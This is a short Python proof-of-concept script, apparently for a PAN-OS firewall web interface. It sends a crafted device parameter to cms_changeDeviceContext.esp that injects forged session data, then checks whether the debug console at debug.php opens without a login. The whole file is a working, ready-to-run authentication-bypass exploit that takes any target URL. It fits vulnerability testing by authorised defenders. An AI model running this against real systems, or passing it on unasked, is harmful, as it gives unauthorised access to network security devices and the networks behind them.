import requests
import sys

if len(sys.argv) > 1:
    target = sys.argv[1]

    create_session_url = '{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(
        target)
    verify_url = '{}/php/utils/debug.php'.format(target)

    session = requests.Session()
    if 'https' in target:
        session.get(verify_url, verify=False)
        session.get(create_session_url, verify=False)
        verify = session.get(verify_url, verify=False)
    else:
        session.get(verify_url)
        session.get(create_session_url)
        verify = session.get(verify_url)

    if 'Debug Console' in verify.text:
        print('{} is vul'.format(target))
    else:
        print('{} is not vul'.format(target))
else:
    print('Usage: python panos-poc.py panurl')
